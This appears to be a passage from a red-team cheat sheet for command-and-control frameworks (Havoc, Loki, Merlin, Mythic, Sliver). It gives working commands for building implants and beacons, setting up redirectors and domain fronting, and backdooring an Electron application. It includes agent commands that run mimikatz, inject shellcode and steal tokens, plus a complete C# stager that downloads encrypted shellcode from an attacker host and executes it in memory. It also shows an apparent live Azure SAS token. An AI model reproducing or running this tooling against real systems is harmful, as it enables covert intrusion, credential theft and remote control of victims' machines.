$ sudo apt-get install -y git build-essential apt-utils cmake libfontconfig1 libglu1-mesa-dev libgtest-dev libspdlog-dev libboost-all-dev libncurses5-dev libgdbm-dev libssl-dev libreadline-dev libffi-dev libsqlite3-dev libbz2-dev mesa-common-dev qtbase5-dev qtchooser qt5-qmake qtbase5-dev-tools libqt5websockets5 libqt5websockets5-dev qtdeclarative5-dev golang-go qtbase5-dev libqt5websockets5-dev libspdlog-dev python3-dev libboost-all-dev mingw-w64 nasm
```

### Installation

#### Building Client

```console
user@host:/opt$ sudo git clone https://github.com/HavocFramework/Havoc.git
user@host:/opt$ cd Havoc/Client
user@host:/opt/Havoc/Client$ make 
user@host:/opt/Havoc/Client$ ./Havoc
```

#### Building Teamserver

```console
user@host:/opt/Havoc/Teamserver$ go mod download golang.org/x/sys
user@host:/opt/Havoc/Teamserver$ go mod download github.com/ugorji/go
user@host:/opt/Havoc/Teamserver$ ./Install.sh
user@host:/opt/Havoc/Teamserver$ make
user@host:/opt/Havoc/Teamserver$ ./teamserver -h
user@host:/opt/Havoc/Teamserver$ sudo ./teamserver server --profile ./profiles/havoc.yaotl -v --debug
```

### Start Teamserver

```console
user@host:/opt/Havoc/Teamserver$ sudo ./teamserver server --profile ./profiles/havoc.yaotl -v --debug
```

### Start Client

```console
user@host:/opt/Havoc/Client$ ./Havoc
```

## Loki

> https://github.com/boku7/Loki

> https://github.com/boku7/Loki/blob/main/docs/azure/create-storage-account-portal.md

### Create Azure Storage Blob Account and get SAS Token

#### Create a Storage Account

1. Go to the Azure Portal.
2. Navigate to Storage accounts and click `Create`.
3. Configure the following:
	- Subscription: Select your subscription.
    - Resource Group: Click `Create new` or select an `existing one`.
    - Storage Account Name: Enter a unique name (e.g., 7200727c985343598e3646).
    - Redundancy: `Locally Redundant Storage (LRS)`.
4. Click `Review + Create`, then `Create`.

#### Generate a SAS Token

1. Go to Storage accounts in the Azure Portal.
2. Click on your storage account (mystorageaccount12345).
3. In the left menu, select `Shared Access Signature`.
4. Configure:
	- Permissions: Check all (`Read`, `Write`, `Delete`, `List`, `Add`, `Create`, `Update`, `Process`).
    - Allowed Services: Select `Blob`, `Queue`, `Table`.
    - Allowed Resource Types: Select `Service`, `Container`, `Object`.
    - Expiry Date: Set to 3 months from today.
    - Protocol: Choose `HTTPS only`.
5. Click `Generate SAS and connection string`.
6. Copy the `SAS Token` and `Blob Service SAS URL`.

### Create Obfuscated Loki Payload

```console
$ npm install --save-dev javascript-obfuscator
```

```console
$ nodejs obfuscateAgent.js
```

```console
[+] Provide Azure storage account information:
        - Enter Storage Account  : ydo5qhvfnnop3binduqk3i.blob.core.windows.net
```

```console
[+] Provide Azure storage account information:
        - Enter Storage Account  : ydo5qhvfnnop3binduqk3i.blob.core.windows.net
        - Enter SAS Token        : sv=2024-11-04&ss=bqt&srt=sco&sp=rwdlacupiytfx&se=2025-07-10T04:03:55Z&st=2025-04-09T20:03:55Z&spr=https&sig=Neb1LiDs%2FLUe%2B1ATBR8fhGqRY39mki3U%2F3rRLefCEUk%3D
```

```console
agent.js  assembly.html  assembly.js  assembly.node  browser.html  browser.js  common.js  config.js  crypt.js  handler.js  keytar.node  main.js  package.json
```

### Backdoor Electron Application

- Your obfuscated Loki payload is output to `./app/`.
- Change directory to the `{<ELECTRON_APP>}/resources/`.
- Delete everything.
- Copy the Loki `./app/` folder to `{<ELECTRON_APP>}/resources/app/`.
- Click the Electron PE file and make sure Loki works.

### Configure Loki Client

- Launch the Loki GUI client.
- From the menubar click `Loki Client > Configuration` to open the `Settings window`.
- Enter in your `Storage Account details` and click `Save`.

## Merlin

> https://github.com/Ne0nd0g/merlin

> https://github.com/Ne0nd0g/merlin-agent

> https://github.com/Ne0nd0g/merlin-agent-dll

> https://merlin-c2.readthedocs.io/en/latest/index.html

### Installation

```console
$ mkdir /opt/merlin;cd /opt/merlin
$ wget https://github.com/Ne0nd0g/merlin/releases/latest/download/merlinServer-Linux-x64.7z
$ 7z x merlinServer-Linux-x64.7z
$ sudo ./merlinServer-Linux-x64
$ ./data/bin/merlinCLI-Linux-x64
```

### Service Configuration

```console
/etc/systemd/system/merlin.service
```

```console
[Unit]
Description=Merlin

[Service]
ExecStart=/PATH/TO/BINARY/merlinServer-Linux-x64
Type=Simple

[Install]
WantedBy=multi-user.target
```

```console
$ systemctl enable merlin.service
$ systemctl start merlin.service
```

### Common Commands

```console
Merlin» help
Merlin» main
Merlin» ! <COMMAND>
Merlin» jobs
Merlin» queue
Merlin» clear
Merlin» modules
Merlin» interact
Merlin» listeners
Merlin» sessions
Merlin» socks
Merlin» reconnect
Merlin» remove
```

### Grouping

```console
Merlin» group add <AGENT> <GROUP>
Merlin» list <GROUP> 
Merlin» remove <AGENT> <GROUP>
```

### Listeners

> https://merlin-c2.readthedocs.io/en/latest/cli/menu/listeners.html

#### Common Commands

```console
Merlin[listeners]» list
Merlin[listeners][e2d9e800-78cc-4347-a232-ce767db508cd]» status
Merlin[listeners][e2d9e800-78cc-4347-a232-ce767db508cd]» start
Merlin[listeners][e2d9e800-78cc-4347-a232-ce767db508cd]» stop
Merlin[listeners][e2d9e800-78cc-4347-a232-ce767db508cd]» delete
```

#### Usage

```console
Merlin» listeners
Merlin[listeners]» use https
Merlin[listeners][HTTPS]» info
Merlin[listeners][HTTPS]» set Interface 0.0.0.0
Merlin[listeners][HTTPS]» set Port <LPORT>
Merlin[listeners][HTTPS]» set PSK <PSK>
Merlin[listeners][HTTPS]» run
Merlin[listeners][HTTPS]» listeners
Merlin[listeners]» list
Merlin[listeners]» interact e2d9e800-78cc-4347-a232-ce767db508cd
```

### Agents

> https://github.com/Ne0nd0g/merlin-agent

> https://github.com/Ne0nd0g/merlin-agent-dll

#### Agent Installation

```console
$ go install github.com/Ne0nd0g/merlin-agent@latest
$ go install github.com/Ne0nd0g/merlin-agent-dll@latest
```

#### Agent Download

```console
$ wget https://github.com/Ne0nd0g/merlin-agent/releases/download/v2.3.0/merlinAgent-Windows-x64.7z
$ wget https://github.com/Ne0nd0g/merlin-agent/releases/download/v2.3.0/merlinAgent-Linux-x64.7z
$ wget https://github.com/Ne0nd0g/merlin-agent/releases/download/v2.3.0/merlinAgent-Darwin-x64.7z
$ wget https://github.com/Ne0nd0g/merlin-agent-dll/releases/download/v2.2.0/merlin-agent-dll.7z
```

#### Build Commands

```console
$ make windows
$ make linux
$ make darwin
$ make mips
$ make arm
```

#### Custom Build Commands

> https://merlin-c2.readthedocs.io/en/latest/agent/custom.html

Please note that you have to be inside the `agent folder` for building agents.

##### Basic Build with no Customization

```console
$ make windows DIR="./output"
```

###### Sample Output

```console
export GOOS=windows GOARCH=amd64;go build -trimpath -ldflags '-s -w -X "main.auth=opaque" -X "main.addr=127.0.0.1:4444" -X "main.transforms=jwe,gob-base" -X "main.listener=" -X "github.com/Ne0nd0g/merlin-agent/v2/core.Build=f0624a3082928d01eaa86a0fb101b0d1d72cde02" -X "main.protocol=h2" -X "main.url=https://127.0.0.1:443" -X "main.host=" -X "main.psk=merlin" -X "main.secure=false" -X "main.sleep=30s" -X "main.proxy=" -X "main.useragent=Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.85 Safari/537.36" -X "main.headers=" -X "main.skew=3000" -X "main.padding=4096" -X "main.killdate=0" -X "main.maxretry=7" -X "main.parrot=" -H=windowsgui -buildid=' -gcflags=all=-trimpath= -asmflags=all=-trimpath= -o ./output/merlinAgent-Windows-x64.exe ./main.go
```

##### Custom Build with customized Parameters

```console
$ make windows ADDR="<LHOST>" DIR="./output" AUTH="opaque" LISTENER="732e296e-7856-4914-961b-b4ba74972b54" KILLDATE="0" RETRY="10" PAD="4096" PROTO="h2" PSK="<PSK>" SKEW="3000" SLEEP="10s" URL="https://<LHOST>:<LPORT>/" USERAGENT="Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.85 Safari/537.36"
```

###### Sample Output

```console
export GOOS=windows GOARCH=amd64;go build -trimpath -ldflags '-s -w -X "main.auth=opaque" -X "main.addr=<LHOST>" -X "main.transforms=jwe,gob-base" -X "main.listener=732e296e-7856-4914-961b-b4ba74972b54" -X "github.com/Ne0nd0g/merlin-agent/v2/core.Build=f0624a3082928d01eaa86a0fb101b0d1d72cde02" -X "main.protocol=h2" -X "main.url=https://<LHOST>:<LPORT>/" -X "main.host=" -X "main.psk=<PSK>" -X "main.secure=false" -X "main.sleep=10s" -X "main.proxy=" -X "main.useragent=Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.85 Safari/537.36" -X "main.headers=" -X "main.skew=3000" -X "main.padding=4096" -X "main.killdate=0" -X "main.maxretry=10" -X "main.parrot=" -H=windowsgui -buildid=' -gcflags=all=-trimpath= -asmflags=all=-trimpath= -o ./output/merlinAgent-Windows-x64.exe ./main.go
```

#### Common Commands

```console
Merlin» interact <AGENT>
Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» checkin
Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» clear
Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» connect
Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» info
Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» status
Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» note
Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» maxretry
Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» skew
Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» sleep
Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» killdate
Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» jobs
Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» socks
Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» env
Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» printenv
Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» ifconfig
Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» pwd
Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» ls
Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» download
Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» upload
Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» nslookup
Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» ssh
Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» rm
Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» run
Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» sdelete
Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» touch
Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» exit
```

##### Examples

```console
Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» env showall
```

#### Linux Specific Commands

```console
Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» memfd
```

#### Windows Specific Commands

```console
Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» ps
Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» pipes
Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» netstat
Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» runas
Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» make_token
Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» steal_token
Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» token
Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» rev2self
Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» execute-assembly
Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» execute-pe
Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» execute-shellcode
Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» load-clr
Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» load-assembly
Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» list-assemblies
Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» invoke-assembly
Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» sharpgen
Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» memory
```

##### Examples

```console
Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» execute-assembly /PATH/TO/BINARY/<BINARY>
Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» execute-assembly /PATH/TO/BINARY/<BINARY> <OPTION> "C:\\Windows\\System32\\WerFault.exe"
Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» execute-pe /PATH/TO/BINARY/mimikatz.exe "coffee exit" "C:\\Windows\\System32\\WerFault.exe"
Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» execute-pe /PATH/TO/BINARY/mimikatz.exe "coffee exit" "C:\\Windows\\System32\\WerFault.exe" <COMMENT>
Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» execute-shellcode self <SHELLCODE>
Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» execute-shellcode remote <PID> <SHELLCODE>
Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» execute-shellcode rtlcreateuserthread <PID> <SHELLCODE>
Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» execute-shellcode userapc <PID> <SHELLCODE>
Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» load-assembly /PATH/TO/BINARY/<BINARY>
Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» invoke-assembly <BINARY>
Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» invoke-assembly <BINARY> <OPTION>
Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» load-clr v4.0
```

#### Example Usage

```console
Merlin» listeners
Merlin[listeners]» use https
Merlin[listeners][HTTPS]» info
Merlin[listeners][HTTPS]» set Interface 0.0.0.0
Merlin[listeners][HTTPS]» set Port <LPORT>
Merlin[listeners][HTTPS]» set PSK <PSK>
Merlin[listeners][HTTPS]» run
```

```console
Merlin» sessions
```

```console
Merlin» interact 2711ef1d-0b53-490d-add9-7ae3c0878b07 
Merlin[agent][2711ef1d-0b53-490d-add9-7ae3c0878b07]» info
```

##### Fixing Error Message: Orphaned Agent JWT detected. Returning 401 instructing the Agent to generate a self-signed JWT and try again.

```console
Merlin[agent][2711ef1d-0b53-490d-add9-7ae3c0878b07]» rev2self
```

#### Domain Fronting

```console
$ make linux URL=http://<>DOMAIN/ HOST=<LHOST> PROTO=http PSK=<PSK>
```

#### Simple Test Execution

```console
$ ./merlinAgent-Linux-x64 -url http://<LHOST>:<LPORT> -psk '<PSK>' -padding 0 -sleep 5s -skew 0 -proto http -v
```

### SOCKS Proxy

```console
Merlin» socks list
Merlin» socks start <PORT> <AGENT>
Merlin» socks stop <PORT> <AGENT>
```

## Mythic

> https://github.com/its-a-feature/Mythic

> https://docs.mythic-c2.net/

> https://github.com/MythicAgents

> https://github.com/MythicC2Profiles

### Installation

```console
$ sudo apt-get install build-essential ca-certificates curl docker.io docker-compose gnupg gpg mingw-w64 g++-mingw-w64 python3-docker
$ git clone https://github.com/its-a-feature/Mythic.git
$ cd Mythic/
$ sudo make
```

### Install HTTP C2 Profile

```console
$ sudo ./mythic-cli install github https://github.com/MythicC2Profiles/http
```

### Install Mythic Agents

```console
$ sudo ./mythic-cli install github https://github.com/MythicAgents/apfell.git
$ sudo ./mythic-cli install github https://github.com/MythicAgents/Apollo.git
$ sudo ./mythic-cli install github https://github.com/MythicAgents/arachne.git
$ sudo ./mythic-cli install github https://github.com/MythicAgents/Athena.git
$ sudo ./mythic-cli install github https://github.com/MythicAgents/freyja.git
$ sudo ./mythic-cli install github https://github.com/MythicAgents/hermes.git
$ sudo ./mythic-cli install github https://github.com/MythicAgents/Medusa.git
$ sudo ./mythic-cli install github https://github.com/MythicAgents/merlin.git
$ sudo ./mythic-cli install github https://github.com/MythicAgents/Nimplant.git
$ sudo ./mythic-cli install github https://github.com/MythicAgents/poseidon.git
```

### Finalize the Installation

Check the `.env` file to grab the credentials for the `mythic_admin` user.

```console
$ cat .env
```

> https://127.0.0.1:7443

### OPSEC Considerations

To not expose any unwanted service rather than accessing them via SSH, double check the settings in the `.env` file.

```console
ALLOWED_IP_BLOCKS="127.0.0.0/16,192.168.10.0/24,172.16.0.0/12,10.0.0.0/8"
```

```console
NGINX_BIND_LOCALHOST_ONLY="true"
```

### Redirector

#### Nginx

##### Domain Fronting Configuration

```console
server {
    listen 80;
    listen [::]:80;

    server_name <DOMAIN>;
    return 302 https://$server_name$request_uri;

    location / {
        limit_except GET HEAD POST { deny all; }
    }
}

server {
    listen 443 ssl http2;
    listen [::]:443 ssl http2;

    server_name <DOMAIN>;

    ssl_certificate /etc/ssl/certs/<DOMAIN>.pem;
    ssl_certificate_key /etc/ssl/private/<DOMAIN>.pem;

    root /var/www/html/<DOMAIN>;
    index index.html;

    location / {
        limit_except GET HEAD POST { deny all;
    }

    location /<RANDOM_VALUE> {
        proxy_pass http://<RHOST>:<RPORT>;
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        proxy_set_header X-Forwarded-Proto $scheme;
    }

        location /<RANDOM_VALUE> {
        set $C2 "";

        if ($http_user_agent ~ "<RANDOM_VALUE>") {
            set $C2 A;
        }

        if ($C2 = 'A') {
            proxy_pass http://<RHOST>:<RPORT>;
        }

        try_files $uri $uri/ =404;
    }
}
```

#### Mythic Server Configuration

##### iptables

The `iptables` rules should only accept traffic for port `22/TCP` and from the `redirector`.

```console
$ /sbin/iptables -F
$ /sbin/iptables -P INPUT DROP
$ /sbin/iptables -P OUTPUT ACCEPT
$ /sbin/iptables -I INPUT -i lo -j ACCEPT
$ /sbin/iptables -A INPUT -p tcp --match multiport --dports 22 -j ACCEPT
$ /sbin/iptables -A INPUT -m conntrack --ctstate RELATED,ESTABLISHED -j ACCEPT
$ /sbin/iptables -A INPUT -s <RHOST> -j ACCEPT
$ /sbin/iptables -A INPUT -j DROP
$ /usr/sbin/netfilter-persistent save
$ /usr/sbin/iptables-save > /root/custom-ip-tables-rules
```

#### HTTP Profile Configuration

| Profile | Option | Value |
| --- | --- | --- |
| callback_host | | https://\<DOMAIN> |
| callback_port | | 443 |
| get_uri | | index |
| headers | User-Agent | <RANDOM_VALUE> |
| query_path_name | | <RANDOM_VALUE> |
| post_uri | | <RANDOM_VALUE> |

## Redirector

### Nginx

#### Multi C2 Domain Fronting Configuration

```console
# Default Setup
server {
    listen 80;
    listen [::]:80;

    server_name <DOMAIN>;
    return 302 https://$server_name$request_uri;

    location / {
        limit_except GET HEAD POST { deny all; }
    }
}

server {
    listen 443 ssl http2;
    listen [::]:443 ssl http2;

    server_name <DOMAIN>;

    ssl_certificate /etc/ssl/certs/<DOMAIN>.pem;
    ssl_certificate_key /etc/ssl/private/<DOMAIN>.pem;

    root /var/www/html/<DOMAIN>;
    index index.html;

    location / {
        limit_except GET HEAD POST { deny all;
    }

    location /<RANDOM_VALUE> {
        proxy_pass http://<RHOST>:<RPORT>;
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        proxy_set_header X-Forwarded-Proto $scheme;
    }

        location /<RANDOM_VALUE> {
        set $C2 "";

        if ($http_user_agent ~ "<RANDOM_VALUE>") {
            set $C2 A;
        }

        if ($C2 = 'A') {
            proxy_pass http://<RHOST>:<RPORT>;
        }

        try_files $uri $uri/ =404;
    }
}

# Sliver Traffic Redirect
server {
    listen 8443 ssl;
    listen [::]:8443 ssl;

    server_name <DOMAIN>;

    root /var/www/html/<DOMAIN>;
    index index.html;

    ssl_certificate /etc/ssl/certs/<DOMAIN>.pem;
    ssl_certificate_key /etc/ssl/private/<DOMAIN>.pem;

    location / {
        try_files $uri $uri/ @c2;
        limit_except GET HEAD POST { deny all; }
    }

    location @c2 {
        proxy_pass http://<RHOST>:8443;
        proxy_redirect off;
        proxy_ssl_verify off;
        proxy_set_header Host $host;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
    }
}
```

### Socat

```console
$ socat TCP4-LISTEN:<LPORT>,fork TCP4:<LHOST>:<LPORT>
```

### Socat + SSH Reverse Port Forwarding

#### Redirector

```console
$ sudo socat tcp-listen:8443,reuseaddr,fork,bind=<LHOST> tcp:127.0.0.1:1234
```

#### C2

```console
$ ssh -N -R 1234:localhost:8443 -i <SSH_KEY> root@<RHOST>
```

### Relaying

#### Prerequisistes

```console
sleep 0       // optional of course
socks 7002    // start SOCKS5 proxy
rpfwd         // open menu for remote port forwarding
172.17.0.1    // Docker gateway
```

## Sliver

> https://github.com/BishopFox/sliver

> https://sliver.sh/docs?name=Stagers

> https://sliver.sh/docs?name=HTTPS+C2

> https://sliver.sh/docs?name=Getting+Started

> https://sliver.sh/docs?name=Getting+Started

### Installation

```console
$ curl https://sliver.sh/install | sudo bash
```

### Quick Start

Download the latest `sliver-server` binary and execute it.

> https://github.com/BishopFox/sliver/releases

```console
$ ./sliver-server_linux 

Sliver  Copyright (C) 2022  Bishop Fox
This program comes with ABSOLUTELY NO WARRANTY; for details type 'licenses'.
This is free software, and you are welcome to redistribute it
under certain conditions; type 'licenses' for details.

Unpacking assets ...
[*] Loaded 20 aliases from disk
[*] Loaded 104 extension(s) from disk

    ███████╗██╗     ██╗██╗   ██╗███████╗██████╗
    ██╔════╝██║     ██║██║   ██║██╔════╝██╔══██╗
    ███████╗██║     ██║██║   ██║█████╗  ██████╔╝
    ╚════██║██║     ██║╚██╗ ██╔╝██╔══╝  ██╔══██╗
    ███████║███████╗██║ ╚████╔╝ ███████╗██║  ██║
    ╚══════╝╚══════╝╚═╝  ╚═══╝  ╚══════╝╚═╝  ╚═╝

All hackers gain evolve
[*] Server v1.5.41 - f2a3915c79b31ab31c0c2f0428bbd53d9e93c54b
[*] Welcome to the sliver shell, please type 'help' for options
```

```console
[server] sliver > multiplayer

[*] Multiplayer mode enabled!
```

```console
[server] sliver > generate --http <LHOST> --os windows --arch amd64 --format exe --save /PATH/TO/FOLDER/
```

```console
[server] sliver > http
```

### Administration

```console
sliver > version
sliver > players
sliver > armory
sliver > armory install all
```

### Multiplayer

#### Register a new Operator

```console
root@c2:~# ./sliver-server operator --name <USERNAME> --lhost 127.0.0.1 --save /home/<USERNAME>/.sliver/configs/<USERNAME>.cfg
```

```console
root@c2:~/.sliver/configs$ chown <USERNAME>:<USERNAME> *.cfg
```

```console
username@c2:~/.sliver/configs$ sliver import <USERNAME>.cfg
```

#### Register a new Operator directly on the Sliver Server

```console
[server] sliver > multiplayer
```

```console
[server] sliver > new-operator --name <USERNAME> --lhost <LHOST>
```

```console
username@c2:~/.sliver/configs$ sliver import <USERNAME>.cfg
```

#### Kick Operator

```console
[server] sliver > kick-operator -n <USERNAME>
```

### OPSEC Considerations

To not expose Sliver to everyone consider binding it only to `localhost` in the `server.json`

```console
"host": "127.0.0.1",
```

### Implant and Beacon Creation 

```
sliver > help generate
sliver > generate --mtls <LHOST> --os windows --save /PATH/TO/BINARY/
sliver > generate --mtls <LHOST> --os windows --arch amd64 --save /PATH/TO/BINARY/
sliver > generate --mtls <LHOST> --os windows --arch amd64 --format exe --save /PATH/TO/BINARY/
sliver > generate --mtls <LHOST> --os windows --arch amd64 --format exe --disable-sgn --save /PATH/TO/BINARY/
sliver > generate --mtls <LHOST> --os windows --arch amd64 --format shared --save /PATH/TO/BINARY/
sliver > generate --mtls <LHOST> --os windows --arch amd64 --format service --save /PATH/TO/BINARY/
sliver > generate --mtls <LHOST> --os windows --arch amd64 --format shellcode --save /PATH/TO/BINARY/
sliver > generate --mtls <LHOST> --os windows --arch amd64 --format exe --save /PATH/TO/BINARY/ --seconds 5 --jitter 3
sliver > generate --mtls <LHOST>:<LPORT> --os windows --arch amd64 --format exe --save /PATH/TO/BINARY/ --seconds 5 --jitter 3
sliver > generate --mtls <LHOST> --os windows --arch amd64 --format shellcode --disable-sgn --skip-symbols --name <NAME> --save /PATH/TO/BINARY/
sliver > generate --http <LHOST> --os windows --arch amd64 --format shellcode --skip-symbols --name <NAME> --save /PATH/TO/BINARY/ -G
sliver > generate stager --lhost <LHOST> --os windows --arch amd64 --format c --save /PATH/TO/BINARY/
sliver > generate beacon --mtls <LHOST> --os windows --save /PATH/TO/BINARY/
sliver > generate beacon --mtls <LHOST> --os windows --arch amd64 --save /PATH/TO/BINARY/
sliver > generate beacon --mtls <LHOST> --os windows --arch amd64 --format exe --save /PATH/TO/BINARY/
sliver > generate beacon --mtls <LHOST> --os windows --arch amd64 --format exe --disable-sgn --save /PATH/TO/BINARY/
sliver > generate beacon --mtls <LHOST> --os windows --arch amd64 --format shared --save /PATH/TO/BINARY/
sliver > generate beacon --mtls <LHOST> --os windows --arch amd64 --format service --save /PATH/TO/BINARY/
sliver > generate beacon --mtls <LHOST> --os windows --arch amd64 --format shellcode --save /PATH/TO/BINARY/
sliver > generate beacon --mtls <LHOST> --os windows --arch amd64 --format exe --save /PATH/TO/BINARY/ --seconds 5 --jitter 3
sliver > generate beacon --mtls <LHOST>:<LPORT> --os windows --arch amd64 --format exe --save /PATH/TO/BINARY/ --seconds 5 --jitter 3
sliver > generate beacon --mtls <LHOST> --os windows --arch amd64 --format shellcode --disable-sgn --skip-symbols --name <NAME> --save /PATH/TO/BINARY/
sliver > generate beacon --http <LHOST> --os windows --arch amd64 --format shellcode --skip-symbols --name <NAME> --save /PATH/TO/BINARY/ -G
sliver > generate beacon --http <LHOST>?proxy=http://<LHOST>:8080,<LHOST>?driver=wininet --os windows --arch amd64 --format shellcode --seconds 30 --jitter 3 --name <NAME> --save /PATH/TO/BINARY/<FILE>.bin -G --skip-symbols
```

### Profiles, Listener and Stagers

> https://sliver.sh/docs

#### Profiles

```console
sliver > profiles new --mtls <LHOST>:<LPORT> --arch amd64 --format shellcode --skip-symbols <PROFILE>
sliver > profiles new beacon --mtls <LHOST>:<LPORT> --arch amd64 --format shellcode --skip-symbols <PROFILE>
```

#### Listener

```console
sliver > stage-listener --url tcp://<LHOST>:<LPORT> --profile <PROFILE>
```

##### Encrypted Listener

```console
sliver > stage-listener --url http://<LHOST>:<LPORT> --profile <PROFILE> --aes-encrypt-key D(G+KbPeShVmYq3t --aes-encrypt-iv 8y/B?E(G+KbPeShV
```

```cpp
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;

namespace Sliver_stager
{
    class Program
    {
        private static string AESKey = "D(G+KbPeShVmYq3t";
        private static string AESIV = "8y/B?E(G+KbPeShV";
        private static string url = "http://<LHOST>:<LPORT>/<NAME>.woff";

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        [DllImport("kernel32.dll")]
        static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

        public static void DownloadAndExecute()
        {
            ServicePointManager.ServerCertificateValidationCallback += (sender, certificate, chain, sslPolicyErrors) => true;
            System.Net.WebClient client = new System.Net.WebClient();
            byte[] shellcode = client.DownloadData(url);

            List<byte> l = new List<byte> { };

            for (int i = 16; i <= shellcode.Length -1; i++) {
                l.Add(shellcode[i]);
            }

            byte[] actual = l.ToArray();

            byte[] decrypted;

            decrypted = Decrypt(actual, AESKey, AESIV);
            IntPtr addr = VirtualAlloc(IntPtr.Zero, (uint)decrypted.Length, 0x3000, 0x40);
            Marshal.Copy(decrypted, 0, addr, decrypted.Length);
            IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
            WaitForSingleObject(hThread, 0xFFFFFFFF);
            return;
        }

        private static byte[] Decrypt(byte[] ciphertext, string AESKey, string AESIV)
        {
            byte[] key = Encoding.UTF8.GetBytes(AESKey);
            byte[] IV = Encoding.UTF8.GetBytes(AESIV);

            using (Aes aesAlg = Aes.Create())
            {
                aesAlg.Key = key;
                aesAlg.IV = IV;
                aesAlg.Padding = PaddingMode.None;

                ICryptoTransform decryptor = aesAlg.CreateDecryptor(aesAlg.Key, aesAlg.IV);

                using (MemoryStream memoryStream = new MemoryStream(ciphertext))
                {
                    using (CryptoStream cryptoStream = new CryptoStream(memoryStream, decryptor, CryptoStreamMode.Write))
                    {
                        cryptoStream.Write(ciphertext, 0, ciphertext.Length);
                        return memoryStream.ToArray();
                    }
                }
            }
        }

        public static void Main(String[] args)
        {
            DownloadAndExecute();
        }
    }
}

```

#### Stager

```console
sliver > generate stager --lhost <LHOST> --lport <LPORT> --arch amd64 --format c --save /PATH/TO/BINARY/
```

#### Examples

```console
sliver > profiles new --mtls <LHOST> --os windows --arch amd64 --format shellcode <PROFILE>
sliver > stage-listener --url http://<LHOST>:<LPORT> --profile <PROFILE>
